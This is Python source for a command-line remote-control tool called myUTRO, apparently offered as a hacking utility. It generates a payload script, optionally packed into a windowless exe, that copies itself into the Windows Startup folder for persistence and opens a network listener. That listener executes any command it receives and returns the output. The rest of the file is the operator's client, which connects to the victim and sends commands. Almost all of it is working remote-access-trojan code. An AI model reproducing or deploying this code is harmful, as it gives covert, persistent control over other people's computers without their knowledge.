import os, sys
try:
    import threading, argparse, socket, platform, time, shutil
    from colorama import Fore,Style
except:
    print("Install Requirements")
    sys.exit()

if platform.system() == "Windows":
    pass
elif platform.system() == "Linux":
   osname="linux"
elif platform.system() == "Kali":
   osname="kali"
print(f"{Style.BRIGHT}")
banner_ascii = f"""
{Fore.RED}                 _   _ _____ ____   ___
{Fore.LIGHTMAGENTA_EX} _ __ ___  _   _| | | |_   _|  _ \ / _ \\
{Fore.RED}| '_ ` _ \| | | | | | | | | | |_) | | | |
{Fore.LIGHTMAGENTA_EX}|_| |_| |_|\__, |\___/  |_| |  _ < \___/
{Fore.RED}           |___/  {Fore.WHITE}by DaM201{Fore.RED} |_| \_\\
                    {Fore.WHITE}Version 0.1.3{Fore.RESET}"""
print(str(banner_ascii))
print(Style.RESET_ALL)
parser = argparse.ArgumentParser()
parser.add_argument("-s", type=str, help="")
parser.add_argument("-c", action="store_true", help="Connect to <IP:PORT>")
parser.add_argument("-r", action="store_true", help="Create a Remote Control With Which you Can Control the Remote PC")
parser.add_argument("-w", action="store_true", help="Trying to connect to <IP:PORT>")
parser.add_argument("-py", action="store_true", help="Remote Control with PY")
parser.add_argument("-exe", action="store_true", help="Remote Control with EXE")
parser.add_argument("--servers", action="store_true", help="Retrieves all servers you have connected to")
args = parser.parse_args()

if args.s:
    if args.w:
        try:
            ip,port = str(args.s).split(":")
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}]{Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.GREEN} PORT is {Fore.WHITE}{port}{Fore.RESET}")
        except:
            ip = str(args.s)
            port = 8080
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Set Port to {Fore.WHITE} 8080 {Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.RESET}")
        retry_time = 1
        

        global running
        running = True
        while running:
            try:
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((ip,int(port)))
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Connected to {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                running = False
                try:
                    with open("history-servers.log", "r") as soubor:
                        stary_obsah = soubor.read()
                except FileNotFoundError:
                    stary_obsah = ""
                with open("history-servers.log", "w") as soubor:
                    soubor.write(stary_obsah + " , " + ip)
                def receive_messages(client_socket):
                    while True:
                        try:
                            message = client_socket.recv(1024).decode()
                            if not message:
                                print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Connection Error{Fore.RESET}")
                                running = True
                            print(message)
                        except ConnectionResetError:
                            print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Connection Error{Fore.RESET}")
                            running = True
                def send_messages(client_socket):
                    while True:
                        message = input(f"{Fore.RED}utro{Fore.WHITE}@{Fore.CYAN}{ip}{Fore.WHITE}:{Fore.CYAN}{port}{Fore.WHITE}-# ")
                        client_socket.send(message.encode())

            
                receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
                receive_thread.start()

                send_messages(client_socket)    


            except:
                print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Connection Error. Reconnecting{Fore.RESET}")
                time.sleep(1)

        


    elif args.c:
        try:
            ip,port = str(args.s).split(":")
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}]{Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.GREEN} PORT is {Fore.WHITE}{port}{Fore.RESET}")
        except:
            ip = str(args.s)
            port = 8080
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Set Port to {Fore.WHITE} 8080 {Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.RESET}")

        
        def receive_messages(client_socket):
                while True:
                    try:
                        message = client_socket.recv(1024).decode()
                        if not message:
                            print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Connection Error{Fore.RESET}")
                            sys.exit()
                        print(message)
                    except ConnectionResetError:
                        print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Connection Error{Fore.RESET}")
                        sys.exit()
        def send_messages(client_socket):
            while True:
                message = input(f"{Fore.RED}utro{Fore.WHITE}@{Fore.CYAN}{ip}{Fore.WHITE}:{Fore.CYAN}{port}{Fore.WHITE}-# ")
                client_socket.send(message.encode())

        try: 
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Trying connect a {Fore.WHITE}{ip}:{port}{Fore.RESET}")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, int(port)))
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Connected to {Fore.WHITE}{ip}:{port}{Fore.RESET}")
            try:
                with open("history-servers.log", "r") as soubor:
                    stary_obsah = soubor.read()
            except FileNotFoundError:
                stary_obsah = ""
            with open("history-servers.log", "w") as soubor:
                soubor.write(stary_obsah + " , " + ip)


        except:
            print(f"{ip}:{int(port)} is not running")
        receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
        receive_thread.start()

        send_messages(client_socket)
      
    if args.r:
        if args.py:
            try:
                ip,port = str(args.s).split(":")
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}]{Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.GREEN} PORT is {Fore.WHITE}{port}{Fore.RESET}")
            except:
                ip = str(args.s)
                port = 8080
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Set Port to {Fore.WHITE} 8080 {Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.RESET}")
            

            log_file_py = f"""
import socket
import threading
import subprocess
import os
import shutil
import platform

if platform.system() == "Windows":
    
    address_file = os.getcwd()
    cesta_k_profilu = os.path.expanduser("~")
    cesta_k_profilu2 = cesta_k_profilu+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
    cesta_k_profilu3 = str(cesta_k_profilu2)


    skript_cesta = os.path.abspath(__file__)

    cilova_cesta = cesta_k_profilu2
    skript_nazev = os.path.basename(skript_cesta)
    nova_cesta = os.path.join(cilova_cesta, skript_nazev)
    shutil.move(skript_cesta, nova_cesta)
else:
    pass
    



def chat():
    ip="{ip}"
    port = {int(port)}
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen()
    clients = []
    def handle_client(client_socket):
        while True:
            try:
                message = client_socket.recv(1024).decode()
                if not message:
                    break
                if message.startswith("cd "):
                    cd_pozice = message[3:]
                    try:
                        os.chdir(cd_pozice)
                    except:
                        pass
                result = subprocess.getstatusoutput(message)
                client_socket.send(result[1].encode())
            except:
                break
        clients.remove(client_socket)
        client_socket.close()
    def broadcast(message):
        for client in clients:
            try:
                client.send(message.encode())
            except:
                clients.remove(client)
    while True:
        client_socket, client_address = server_socket.accept()
        clients.append(client_socket)
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()
chat()"""
            try:
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Creating Remote Server{Fore.RESET}")
                try:
                    open("remote.py","a").close()
                    with open("remote.py","+w") as f:
                        f.write(log_file_py)
                except:
                    print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                    sys.exit()
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Created Remote Server{Fore.RESET}")
                try:
                    print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Finding...{Fore.RESET}")
                    if os.path.exists("remote.py"):
                        print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Remote Server successfully installed{Fore.RESET}")                        
                        sys.exit()
                    if not os.path.exists("remote.py"):
                        print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                        sys.exit()
                except:
                    print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                    sys.exit()
            except:
                print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                sys.exit()

        elif args.exe:
            try:
                ip,port = str(args.s).split(":")
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}]{Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.GREEN} PORT is {Fore.WHITE}{port}{Fore.RESET}")
            except:
                ip = str(args.s)
                port = 8080
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Set Port to {Fore.WHITE} 8080 {Fore.GREEN} IP is {Fore.WHITE}{ip}{Fore.RESET}")
            log_file_py = f"""
import socket
import threading
import subprocess
import os
import shutil
import platform

if platform.system() == "Windows":
    
    address_file = os.getcwd()
    cesta_k_profilu = os.path.expanduser("~")
    cesta_k_profilu2 = cesta_k_profilu+r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" 
    cesta_k_profilu3 = str(cesta_k_profilu2)


    skript_cesta = os.path.abspath(__file__)

    cilova_cesta = cesta_k_profilu2
    skript_nazev = os.path.basename(skript_cesta)
    nova_cesta = os.path.join(cilova_cesta, skript_nazev)
    shutil.move(skript_cesta, nova_cesta)
else:
    pass
    
def chat():
    ip="{ip}"
    port = {int(port)}
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen()
    clients = []
    def handle_client(client_socket):
        while True:
            try:
                message = client_socket.recv(1024).decode()
                if not message:
                    break
                result = subprocess.getstatusoutput(message)
                client_socket.send(result[1].encode())
            except:
                break
        clients.remove(client_socket)
        client_socket.close()
    def broadcast(message):
        for client in clients:
            try:
                client.send(message.encode())
            except:
                clients.remove(client)
    while True:
        client_socket, client_address = server_socket.accept()
        clients.append(client_socket)
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()
chat()"""
            try:
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Creating Remote Server{Fore.RESET}")
                try:
                    open("remote.py","a").close()
                    with open("remote.py","+w") as f:
                        f.write(log_file_py)
                except:
                    print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                    sys.exit()
                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Created Remote Server{Fore.RESET}")
                try:
                    print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Finding...{Fore.RESET}")
                    if os.path.exists("remote.py"):
                        print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Installing PyInstaller{Fore.RESET}")
                        os.system("pip install pyinstaller")
                        print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Installed PyInstaller{Fore.RESET}")
                        print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Converting remote.py to remote.exe{Fore.RESET}")
                        try:
                            os.system("pyinstaller --noconfirm --onefile --windowed  \"remote.py\"")
                            try:
                                os.chdir("dist")
                                adders = os.getcwd()
                                print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}File is on the {adders}{Fore.RESET}")
                                sys.exit()
                            except:
                                print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Exe File {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                                sys.exit()
                        except:
                            print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Exe File {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                            sys.exit()
                        

                        sys.exit()
                    else:
                        print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                        sys.exit()
                except:
                    print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                    sys.exit()
            except:
                print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}Error with Creating Remote Server {Fore.WHITE}{ip}:{port}{Fore.RESET}")
                sys.exit()

    else:
        pass
if args.servers:
    if os.path.exists("history-servers.log"):
        with open("history-servers.log","+r") as f:
            servers = f.read()
            addresses = servers.split(' , ')
            for server in addresses:
                
                print(Fore.YELLOW+server+Fore.RESET)
            sys.exit()
    else:
        print(f"{Fore.MAGENTA}[{Fore.WHITE}ERROR{Fore.MAGENTA}] {Fore.RED}\"history-servers.log\" Not Found{Fore.RESET}")
        print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Creating \"history-servers.log\"{Fore.RESET}")
        open("history-servers.log","a").close()
        if os.path.exists("history-servers.log"):
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Created \"history-servers.log\"{Fore.RESET}")
            sys.exit()
        else:
            print(f"{Fore.CYAN}[{Fore.WHITE}INFO{Fore.CYAN}] {Fore.GREEN}Error with Creating \"history-servers.log\"{Fore.RESET}")
            sys.exit()
else:
    log_help = """
usage: utro.py [-h] [-s S] [-c] [-r] [-w] [-py] [-exe]
               [--servers]

options:
  -h, --help  show this help message and exit
  -s S
  -c          Connect to <IP:PORT>
  -r          Create a Remote Control With Which you Can
              Control the Remote PC
  -w          Trying to connect to <IP:PORT>
  -py         Remote Control with PY
  -exe        Remote Control with EXE
  --servers   Retrieves all servers you have connected to
"""
    print(log_help)
    sys.exit()
